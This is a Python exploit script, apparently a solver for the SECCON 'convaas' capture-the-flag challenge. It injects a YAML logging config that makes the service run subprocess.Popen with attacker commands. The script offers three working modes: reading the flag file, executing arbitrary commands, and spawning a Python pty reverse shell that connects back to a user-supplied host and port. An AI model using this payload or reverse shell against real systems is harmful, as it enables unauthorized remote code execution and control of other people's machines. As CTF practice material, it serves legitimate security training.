import argparse
import logging
import os
import pathlib
import re
import shlex
import socket
import sys

import yaml

logger = logging.getLogger(__name__)


def recvuntil(s, delimiter):
    chunk = b""
    while not chunk.endswith(delimiter):
        c = s.recv(1)
        if not c:
            break
        chunk += c
    return chunk


def generate_exploit(payload):
    return yaml.safe_dump(
        {
            "version": 1,
            "common": {
                "logging": {
                    "version": 1,
                    "handlers": {
                        "h": {"class": "subprocess.Popen", "args": shlex.split(payload)}
                    },
                }
            },
            "converter": {
                "logging": {},
            },
        }
    )


def attack(rhp, payload):
    filename = "convaas.yaml"
    exploit = generate_exploit(payload)
    file_size = len(exploit)
    output_type = pathlib.Path(filename).suffix[1:]
    response = b""

    try:
        with socket.create_connection(rhp) as s:
            logger.info(f"connected to {':'.join(map(str, rhp))}")

            recvuntil(s, b"Input filename (ini/json/toml/yaml) > ")
            logger.debug(f"{filename=}")
            s.sendall(filename.encode() + b"\n")

            recvuntil(s, b"Size of content (0, 1024] > ")
            logger.debug(f"{file_size=}")
            s.sendall(str(file_size).encode() + b"\n")

            recvuntil(s, b"Content > ")
            logger.debug(f"exploit:\n{exploit}")
            s.sendall(exploit.encode())

            recvuntil(s, b"Output type (ini/json/toml/yaml) > ")
            logger.debug(f"{output_type=}")
            s.sendall(output_type.encode() + b"\n")

            response += recvuntil(s, b"-------------------------\n")
            logger.debug(f"response:\n{response.decode()}")
    except Exception as e:
        logger.exception(e)

    return response


def get_flag(rhp):
    response = attack(rhp, "cat /home/convaas/flag.txt")
    m = re.search(r"SECCON{[^}]+}", response.decode())
    if not m:
        logger.error("no flag.")
        return
    flag = m.group(0)
    logger.info(f"retrieved flag: {flag}")
    return flag


def execute(rhp, command):
    response = attack(rhp, command)
    extractor = r"(?<=\n--- CONVERSION RESULT ---\n).*(?=-------------------------\n)"
    m = re.search(extractor, response.decode(), re.S)
    return m.group(0) if m else None


def get_connect_back_shell(rhp, lhp):
    payload_python = f"""##!/usr/bin/env python

import os
import pty
import socket

s = socket.create_connection({lhp!r})
for fd in (0, 1, 2):
    os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
"""
    payload_sh = f"echo -e {shlex.quote(payload_python[1:])} | python"
    attack(rhp, f"sh -c {shlex.quote(payload_sh)}")


def main(args):
    if args.host is None or args.port is None:
        logger.error("specify host and port")
        return os.EX_DATAERR

    rhp = (args.host, int(args.port))
    logger.debug(f"{rhp=}")

    if args.connect_back is not None:
        lhost, lport = args.connect_back.split(":")
        get_connect_back_shell(rhp, (lhost, int(lport)))
    elif args.execute is not None:
        print(execute(rhp, args.execute))
    else:
        print(get_flag(rhp))

    return os.EX_OK


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--host",
        "-H",
        default=os.getenv("SECCON_HOST"),
        help="Specify hostname to connect.",
    )
    parser.add_argument(
        "--port",
        "-p",
        default=os.getenv("SECCON_PORT"),
        help="Specify port number to connect.",
    )
    parser.add_argument(
        "--debug", "-d", help="Display debug output.", action="store_true"
    )
    parser.add_argument("--connect-back", help="Host-port pair for connect-back shell.")
    parser.add_argument("--execute", help="Command to execute on the target.")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="[%(levelname)s] %(message)s",
    )
    logging.addLevelName(logging.INFO, "*")
    logging.addLevelName(logging.WARN, "!")
    logging.addLevelName(logging.ERROR, "-")

    try:
        sys.exit(main(args))
    except Exception as e:
        logger.exception(e)
        sys.exit(os.EX_SOFTWARE)
